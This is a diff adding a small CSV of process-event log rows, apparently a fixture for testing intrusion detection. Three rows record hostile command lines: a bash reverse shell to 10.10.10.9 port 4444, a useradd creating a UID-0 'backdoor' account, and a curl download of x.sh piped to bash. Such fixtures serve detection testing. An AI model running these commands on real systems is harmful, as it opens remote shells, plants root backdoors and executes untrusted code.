@@ -1,0 +1,5 @@
+timestamp,host,event_type,pid,ppid,process_name,process_path,command_line,user
+2026-06-18T10:00:00+00:00,csv-host-01,process,4100,4000,sshd,/usr/sbin/sshd,/usr/sbin/sshd -D,root
+2026-06-18T10:00:05+00:00,csv-host-01,process,4200,4100,bash,/bin/bash,bash -i >& /dev/tcp/10.10.10.9/4444 0>&1,www-data
+2026-06-18T10:00:09+00:00,csv-host-01,process,4300,4200,useradd,/usr/sbin/useradd,useradd -o -u 0 backdoor,root
+2026-06-18T10:00:12+00:00,csv-host-01,process,4400,4200,curl,/usr/bin/curl,curl http://10.10.10.9/x.sh | bash,www-data
